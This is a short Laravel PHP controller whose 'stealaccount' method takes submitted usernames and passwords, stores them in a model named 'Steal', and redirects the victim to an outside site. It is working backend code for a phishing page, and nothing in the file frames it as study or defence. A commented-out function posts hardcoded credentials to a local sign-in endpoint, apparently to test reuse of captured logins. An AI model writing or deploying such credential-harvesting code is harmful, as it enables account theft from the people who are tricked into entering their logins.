<?php

namespace App\Http\Controllers;


use App\Models\Steal;
use Auth;
use Illuminate\Http\Request;
use GuzzleHttp\Client;
class LoginController extends Controller
{
    public function stealaccount(Request $request){
       $data = $request->only('username','password');
       Steal::create($data);

        return redirect()->secure('https://www.m88lv.com/');
    }

    // public function logintowebsiteB(){
    //     $client = new Client();
    
    //     $response = $client->post('http://127.0.0.1:8001/account/signin/postsignin', [
    //         'form_params' => [
    //             'email' => 'nguyentantrung_01@yhaoo.com',
    //             'password' => '123456789',
                
    //         ],
    //     ]);
    
    //     $body = $response->getBody()->getContents();
    //     return $body;
    // }
}
